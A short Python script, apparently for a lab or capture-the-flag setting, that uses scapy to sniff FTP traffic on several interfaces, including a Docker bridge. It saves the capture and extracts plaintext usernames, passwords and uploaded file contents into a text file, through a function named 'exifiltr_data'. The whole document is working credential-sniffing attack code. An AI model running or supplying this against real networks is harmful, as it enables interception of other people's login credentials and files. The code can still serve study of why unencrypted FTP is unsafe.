#!/usr/bin/python3
from scapy.all import *

interfaces = ["eth0", "lo", "br-5553900d8119"]
capture = sniff(iface=interfaces, filter="port 21 or (portrange 21100-21110)", count=90)
wrpcap("capturestocker.pcap", capture)

def parse_pcap(capture_file):
    packets = rdpcap(capture_file)
    raw_data_list = []

    for packet in packets:
        print(packet.summary())
        
        if Raw in packet:
            raw_data = packet[Raw].load.decode('utf-8')

            if raw_data.startswith('USER'):
                username = raw_data.split(' ')[1].strip()
                raw_data_list.append(f'Username: {username}')

            elif raw_data.startswith('PASS'):
                password = raw_data.split(' ')[1].strip()
                raw_data_list.append(f'Password: {password}')

            elif raw_data.startswith('STOR'):
                filename = raw_data.split(' ')[1].strip()
                raw_data_list.append(f'File: {filename}')
                raw_data_list.append('---Start of File Content---')

                for next_packet in packets[packets.index(packet) + 1:]:
                    if Raw in next_packet:
                        next_raw_data = next_packet[Raw].load.decode('utf-8')
                        if next_raw_data.startswith('STOR'):
                            break
                        else:
                            raw_data_list.append(next_raw_data)
                raw_data_list.append('---End of File Content---')

#            print(f"Raw Data: {raw_data}")
            format_raw = f"Raw Data: {raw_data}"+"\n"
            raw_data_list.append(format_raw)

    return raw_data_list

def exifiltr_data(raw_data_list):
    with open("FTP_rawdata.txt", "w") as w:
        for data in raw_data_list:
            cleaned_data = data.strip("b'\n")
            w.write(cleaned_data + '\n')

def read_data():
    with open("FTP_rawdata.txt", "r") as r:
        read_data_lines = r.readlines()

    return read_data_lines

if __name__ == "__main__":
    packets = parse_pcap("capturestocker.pcap")
    exifiltr_data(packets)  
    read_data()
    print("\r"+"#" * 50 + "\n")
    
